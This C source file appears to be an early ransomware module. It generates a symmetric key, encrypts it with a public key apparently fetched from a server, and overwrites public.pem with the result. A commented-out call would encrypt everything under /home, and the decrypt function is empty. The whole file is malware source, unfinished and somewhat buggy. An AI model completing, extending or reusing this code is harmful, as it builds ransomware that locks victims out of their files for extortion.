#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "server.h"
#include "filescan.h"
#include "crypto.h"

void extractId(key_id *ki){
    FILE *k = fopen("public.pem", "rb");
    int id = 0; char ch;
    ch = fgetc(k);
    while(ch!='!'){
        id = id*10 + (ch-'0');
        ch = fgetc(k);
    }
    ki->id = id;
    ch = fgetc(k);
    int l = 0;
    while(!feof(k)){
        ki->key[l] = ch;
        l++;
        ch = fgetc(k);
    }
    fclose(k);
}

void encrypt(){
    key_id ki;
    getKeyId(&ki);
    unsigned char key[32];
    newKey(key);
    //scanAndCrypt("/home", key, true);
    unsigned char d[3000];
    public_encrypt(key, 32, ki.key, d);
    FILE *k = fopen("public.pem", "wb");
    fprintf(k, "%d!%s", ki.id, d);
    fclose(k);
    //free(d);
}

void decrypt(){

}

int main(int n, char *args[n]){
    encrypt();
}
